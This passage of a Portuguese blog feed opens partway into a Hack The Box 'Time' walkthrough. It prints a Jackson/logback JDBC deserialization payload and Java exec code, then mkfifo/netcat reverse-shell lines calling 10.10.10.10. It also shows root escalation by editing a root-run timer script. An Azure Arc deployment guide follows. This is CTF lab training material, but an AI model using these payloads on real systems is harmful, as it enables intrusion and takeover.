    &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;useDelimiter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;CALL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Configurando listener via netcat com o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4443&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Enviado o payload abaixo na aplicação no lugar do JSON a ser validado.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/xsb87hN.png&quot; alt=&quot;Listener and Webserver - Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/SiAG5hB.png&quot; alt=&quot;Online Json Parser - Sending the payload&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Após upgrade do shell, iniciado enumeração e identificado que o usuário utilizado, &lt;strong&gt;pericles&lt;/strong&gt;, era um usuário comum do Linux e não possuía nenhum tipo de privilégio especial.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pericles@time:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Acessando seu diretório raiz, encontrado o user.txt onde foi obtido o primeiro flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pericles@time:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
pericles@time:/home/pericles&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
&amp;lt;redacted&amp;gt;
pericles@time:/home/pericles&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Antes de dar continuidade na enumeração, para simplificar o processo de obtenção de um shell reverso se necessário, criado uma chave SSH usando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; e incluído a chave pública no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.ssh/authorized_keys&lt;/code&gt;, o que nos permidiu conectar diretamente ao usuário pericles via SSH.&lt;/p&gt;

&lt;p&gt;A enumeração foi realizada utilizando o script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; e um dos itens encontrados chamou bastante atenção, fazendo referência ao nome da máquina: um arquivo shell de propriedade do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pericles&lt;/code&gt; no caminho &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/timer_backup.sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Este arquivo está configurado para execução através de um &lt;strong&gt;system timer&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/systemd/system/timer_backup.timer&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/systemd/system/timer_backup.service&lt;/code&gt;) e configurado para execução &lt;strong&gt;a cada 10s&lt;/strong&gt; com privilegios de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como temos privilégios para editar o shell script, inclui a linha abaixo para obter um shell reverso e, após alguns segundos, recebi um shell reverso! :smile:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/g&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/g&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/g|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como o processo é reexecutado após 10s, todos os processos existentes são finalizados e perdemos a conexão com a máquina. Apenas obter o flag de root é uma tarefa possível neste tempo, o que foi utilizado inicialmente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.10] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.214] 33304
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
&amp;lt;redacted&amp;gt;
#      
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Caso queira uma conexão mais persistente temos duas opções iniciais:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Configurar o system timer para incluir a chave pública no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt;, nos permitindo conectar via SSH como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Iniciar outro shell reverso assim que obtermos a conexão inicial, que pode ser alcançado de múltiplas formas como Metasploit AutoRunScript e colocando uma instrução para ser passada assim que uma conexão via netcat é estabelecida, conforme podemos ver abaixo onde o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; é executado assim que a sessão é iniciada:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenha sido útil e vejo vocês no próximo post! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Time, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW e felamos.</summary></entry><entry><title type="html">Azure Arc enabled Servers: Instalação e Atualização via Configuration Manager</title><link href="https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/" rel="alternate" type="text/html" title="Azure Arc enabled Servers: Instalação e Atualização via Configuration Manager" /><published>2021-04-01T09:00:00-03:00</published><updated>2021-04-01T09:00:00-03:00</updated><id>https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr</id><content type="html" xml:base="https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/">&lt;p&gt;Neste post compartilho o procedimento de como realizar o deploy e atualização do Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM).&lt;/p&gt;

&lt;p&gt;O processo é bastante simples, porém algumas pequenas dicas são compartilhadas para que possa obter o máximo do ConfigMgr para esta atividade :smile:.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Nota&lt;/strong&gt;: Os scripts compartilhados neste post também poderão ser utilizado a partir de outras ferramentas de gestão de configuração, porém ajustes podem ser necessários para que funcionem adequadamente de acordo com o método utilizado.&lt;/p&gt;

&lt;h2 id=&quot;azure-arc-enabled-servers&quot;&gt;Azure Arc enabled Servers&lt;/h2&gt;

&lt;p&gt;O Azure Arc permite o gerenciamento de servidores físicos e virtuais fora do Azure a partir da console do Azure, permitindo que gerencie extensões, atualizações e guest policies de forma consistente do mesmo modo em que máquinas virtuais nativas do Azure são gerenciadas.&lt;/p&gt;

&lt;p&gt;O Azure Arc é um asset bastante importante para utilização de features como o Vulnerability Assessment do Azure Defender, assim como a manutenção de algumas extensões como Microsoft Monitoring Agent (MMA) e o novo Azure Monitor Agent (AMA).&lt;/p&gt;

&lt;h3 id=&quot;preço&quot;&gt;Preço&lt;/h3&gt;

&lt;p&gt;De acordo com a página &lt;a href=&quot;https://azure.microsoft.com/en-us/pricing/details/azure-arc/&quot;&gt;Azure Arc – Azure Management | Microsoft Azure&lt;/a&gt;, features relacionadas ao control plane do Azure (Instalação de Extensões, Arm Templates, etc.) &lt;strong&gt;são gratuitos&lt;/strong&gt;, assim como o uso do Azure Update Management.&lt;/p&gt;

&lt;p&gt;Features relacionadas à Azure Policy Guest Configurations (Automações, inventários, state configuration) e outros serviços conectados via Arc (Azure Defender e Azure Monitor, por exemplo) são cobrados de acordo com suas respectivas tabelas de custos, as quais poderão ser verificadas diretamente na &lt;a href=&quot;https://azure.microsoft.com/en-us/pricing/calculator/&quot;&gt;calculadora do Azure&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;pré-requisitos&quot;&gt;Pré-requisitos&lt;/h3&gt;

&lt;p&gt;Alguns requisitos devem ser observados para viabilizar esta instalação, cujos detalhes podem ser observados no link &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/agent-overview#prerequisites&quot;&gt;Overview of the Connected Machine agent - Azure Arc | Microsoft Docs&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Um Sistema Operacional Suportado.&lt;/li&gt;
  &lt;li&gt;Liberação das URLs necessárias para o Serviço do Azure Arc, vide link acima citado.
    &lt;ul&gt;
      &lt;li&gt;Dependendo de como seu ambiente está configurado, o uso de um servidor proxy pode ser necessário.&lt;/li&gt;
      &lt;li&gt;Algumas extensões a serem instaladas via Arc podem necessitar de liberações adicionais para garantir seu funcionamento.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Provisionamento de um Service Principal para que o onboarding do Arc seja feito de modo silencioso. O procedimento de criação deste objeto está disponível detalhado em &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-service-principal&quot;&gt;Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Ativação dos resource providers &lt;strong&gt;Microsoft.HybridCompute&lt;/strong&gt; e &lt;strong&gt;Microsoft.GuestConfiguration&lt;/strong&gt;, conforme discutido em &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/learn/quick-enable-hybrid-vm#register-azure-resource-providers&quot;&gt;Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;gestão-via-configuration-configuration-manager&quot;&gt;Gestão via Configuration Configuration Manager&lt;/h2&gt;

&lt;p&gt;Caso sua organização já faça uso do Configuration Manager para gestão de dispositivos, o mesmo também poderá ser utilizado para instalação e atualização do Azure Machine Connected Agent, utilizado pelo Azure Arc.&lt;/p&gt;

&lt;h3 id=&quot;instalação-do-agente&quot;&gt;Instalação do Agente&lt;/h3&gt;

&lt;p&gt;Utilizando o recurso de &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/create-applications&quot;&gt;Applications do Configuration Manager&lt;/a&gt;, temos a possibilidade de garantir que estes agentes estão instalados adequadamente em um dispositivo, o que permite uma melhor gestão do status de instalação do pacote após sua execução.&lt;/p&gt;

&lt;p&gt;Abaixo descrevo o procedimento utilizado para criar este recurso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Download da última release do instalador do Arc para Windows: O binário de instalação pode ser baixado diretamente da URL encurtada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://aka.ms/AzureConnectedMachineAgent&lt;/code&gt;. A linha de PowerShell abaixo salva o arquivo em um diretório especificado.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;O arquivo deverá ser copiado para um diretório a ser utilizado pelo MECM como content source&lt;/li&gt;
    &lt;/ul&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\path\to\file&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;https://aka.ms/AzureConnectedMachineAgent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\AzureConnectedMachineAgent.msi&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Baixar e editar o script &lt;a href=&quot;https://github.com/davi-cruz/Security/blob/main/AzureArc/Windows/Install-AzureArcMECM.ps1&quot;&gt;Install-AzureArcMECM.ps1&lt;/a&gt; e editar as variáveis conforme exemplo abaixo. Este script deverá ser colocado no mesmo caminho onde o arquivo *.msi baixado anteriormente está localizado.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Caso seu servidor necessite de um proxy para comunicação. especifique a variável &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$proxyUrl&lt;/code&gt;. Caso contrário, mantenha o valor &lt;strong&gt;em branco&lt;/strong&gt;.&lt;/li&gt;
      &lt;li&gt;O script compartilhado, além de instalar o agente, realiza a configuração de proxy (se informado) e conecta o dispositivo ao serviço do Arc, conforme credenciais compartilhadas:&lt;/li&gt;
    &lt;/ul&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## Variables&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$installLogFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\Temp\AzureArcSetup.log&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tenantID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;7482a3c1-7102-4a0d-9dfb-0aa2186ce450&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$subscriptionID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;48a0ab65-bd82-4aac-9283-99344f387d9b&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ResourceGroupName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rg-azurearc-windows&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$serviceprincipalAppID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;909e06f7-577c-45b9-b49e-eff9e6560ef6&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$serviceprincipalSecret&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f53f0a59-6db3-4ac7-b861-e760d29240d8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$resourceLocation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eastus&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$proxyUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Format: http[s]://server.fqdn:port&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;### Sample data provided for illustration purposes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Seguir com a criação do application no console do MECM acessando &lt;em&gt;Software Library&lt;/em&gt; &amp;gt; &lt;em&gt;Application Management&lt;/em&gt; &amp;gt; &lt;em&gt;Applications&lt;/em&gt; e selecionar a opção &lt;em&gt;Create Application&lt;/em&gt; no ribbon ou no menu de contexto de &lt;em&gt;Application&lt;/em&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UTfhvOv.png&quot; alt=&quot;Creating an Application on MECM&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Selecione o arquivo caminho do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.msi&lt;/code&gt; no File Share onde foi armazenado, de acordo com o pré-estabelecido em seu ambiente.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dE4HPPW.png&quot; alt=&quot;Create Application Wizard - General&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Clique em &lt;em&gt;Next&lt;/em&gt; para avançar após validar os dados do aplicativo a ser instalado.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/RIHhWc0.png&quot; alt=&quot;Create Application Wizard - Important Information&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Em &lt;em&gt;General Information&lt;/em&gt;, substitua a linha de comando pré-configurada com a linha de comando abaixo para que a instalação ocorra a partir do script PowerShell baixado e clique em &lt;em&gt;Next&lt;/em&gt;.&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%windir%&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&quot;se&quot;&gt;\v&lt;/span&gt;1.0&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;owershell.exe &lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt; .&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;nstall-AzureArcMECM.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p class=&quot;notice--primary&quot;&gt;:bulb: &lt;strong&gt;Dica&lt;/strong&gt;: Complemente nesta janela também as informações solicitadas para enriquecer os dados de catálogo para este aplicativo e simplificar sua gestão posterior.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/V6qUH4B.png&quot; alt=&quot;Create Application Wizard - General Information&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Revise as informações configuradas e clique em &lt;em&gt;Next&lt;/em&gt; para criar o application.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tYcMhvu.png&quot; alt=&quot;Create Application Wizard - Summary&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Após concluída a criação, a seguinte mensagem de sucesso será exibida. Clique em &lt;em&gt;Close&lt;/em&gt; para fechá-la.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/93fBtqs.png&quot; alt=&quot;Create Application Wizard - Completion&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após criar o application, precisaremos ajudar alguns outros detalhes para que funcione de forma mais adequada, conforme abaixo:&lt;/p&gt;

&lt;ul&gt;
